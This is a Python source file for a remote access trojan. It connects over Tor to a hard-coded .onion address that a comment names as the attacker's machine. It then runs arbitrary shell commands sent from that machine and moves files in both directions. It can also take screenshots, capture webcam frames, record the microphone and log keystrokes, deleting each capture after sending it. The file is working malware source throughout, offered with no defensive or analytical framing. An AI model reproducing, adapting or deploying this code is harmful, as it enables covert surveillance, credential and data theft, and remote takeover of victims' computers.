import socket
import socks
import subprocess
import os
import base64
import time
import threading
import cv2
import wave
import struct
import pyaudio
from PIL import ImageGrab
from pynput import keyboard
import json
import uuid


stopkeylogg = False
stopmic = False
# RAT:

def connect():
	while True:
		try:
			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
			socket.socket = socks.socksocket
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect(('wkrsqzpbk7th67oimwjaox2kcqm4d6fb4ewowwl6s2qz6pnfiznxkjyd.onion', 4444))  # IP and Port of the attacker machine
			return s
		except Exception:
			time.sleep(5)
			continue


def execute_commands(command):
	try:
		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
		return output.decode(errors='replace')
	except Exception as e:
		return str(e)


def write_file(path, content):
	with open(path, 'wb') as f:
		f.write(content)

def recvall(sock, size):
    data = b""
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            return None
        data += packet
    return data


def send_file(sock, path):
    with open(path, "rb") as f:
        data = f.read()

    size = len(data)

    sock.sendall(struct.pack("!Q", size))
    sock.sendall(data)

def capture_screen():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screen.png", "PNG")
        return 
    except Exception as e:
        return f"Error capturing screen: {str(e)}"

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Error: Could not open webcam."
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.png", frame)
            cap.release()
            return 
        else:
            cap.release()
            return "Error: Could not capture frame from webcam."
    except Exception as e:
        return f"Error capturing webcam: {str(e)}"
def send_post_req(time_interval):
    global  stopkeylogg,text
    while not stopkeylogg:
        try:
            payload = json.dumps({"keyboardData": text})
            with open("Keylogg.txt", "a", encoding="utf-8") as f:
                f.write(payload + "\n")
            text = ""
        except Exception as e:
            print(e)
            print("Couldn't complete request!")
        for _ in range(time_interval):
            if stopkeylogg:
                break
            time.sleep(1)

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")

def keylogger():
    global text
    text = ""
    time_interval = 30
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    send_post_req(time_interval)

    listener.stop()

def record_microphone():
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)
        
        frames = []
        while not stopmic : 
            if stopmic:
                break
            data = stream.read(CHUNK)
            frames.append(data)
	
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        waveFile = wave.open('microphone.wav', 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
        
        return 
    except Exception as e:
        return f"Error recording microphone: {str(e)}"

# --- RAT Command Handler ---
def rat_client():
	global stopmic,stopkeylogg
	s = connect()
	CLIENT_ID = str(uuid.uuid4())
	s.send(CLIENT_ID.encode())
	try:
		while True:
			data = s.recv(1000000)
			if not data:
				break
			command = data.decode()
			if command.lower() == 'exit':
				break
			elif command.startswith('cd '):
				try:
					os.chdir(command[3:])
					s.send(str.encode(os.getcwd()))
				except Exception as e:
					s.send(str.encode(str(e)))
			elif command.startswith('download '):
				path = command[9:]
				try:
					if os.path.exists(path):
						send_file(s,path)
					else:
						s.send(str.encode("File not found"))
				except Exception as e:
					s.send(str.encode(f"Error: {str(e)}"))
			elif command.startswith('upload '):
				path = command.split(' ')[2]
				size = struct.unpack("!Q", recvall(s, 8))[0]
				content = recvall(s, size)
				write_file(path, content)
				s.send(str.encode("Upload complete"))
			elif command == 'keylogger':
				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
				stopkeylogg = False
				s.send(str.encode("Keylogging ..."))
				keylogger_thread.start()
			elif command == 'getkeylogger':
				if keylogger_thread.is_alive():
					stopkeylogg = True
					keylogger_thread.join()
					send_file(s,"keylogg.txt")
					execute_commands("del keylogg.txt")
				else:
					s.send(str.encode("Error:Keylogger is not running."))
			elif command == 'screenshot':
				capture_screen()
				send_file(s,"screen.png")
				execute_commands("del screen.png")
			elif command == 'webcam':
				capture_webcam()
				send_file(s,"webcam.png")
				execute_commands("del webcam.png")
			elif command.startswith('mic'):
				mic_thread=threading.Thread(target=record_microphone, daemon=True)
				stopmic = False
				s.send(str.encode("Recording ..."))
				mic_thread.start()
			elif command == 'getmicrecord':
				if mic_thread.is_alive():
					stopmic = True
					mic_thread.join()
					send_file(s,"microphone.wav")
					execute_commands("del microphone.wav")
				else:
					s.send(str.encode("Error:Microphone recording is not running."))
			else:
				output = execute_commands(command)
				s.send(str.encode(output))
				
	except socket.error as e:
		print(f"Socket error: {e}. Reconnecting...")
		s.close()
	except Exception as e:
		print(f"An error occurred: {e}")
		
		s.send(str.encode(f"Error: {str(e)}"))
	finally:
		s.close()
		rat_client()




# Main
def start_tor():
	execute_commands("cd trojan/tor/tor")
	execute_commands("tor.exe")
	time.sleep(10)
def main():
	
	tor_process = subprocess.Popen(
    "trojan/tor/tor/tor.exe",
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
	)
	ratThread = threading.Thread(target=rat_client, daemon=True)
	ratThread.start()
	ratThread.join()
	tor_process.terminate()


if __name__ == "__main__":
	main()
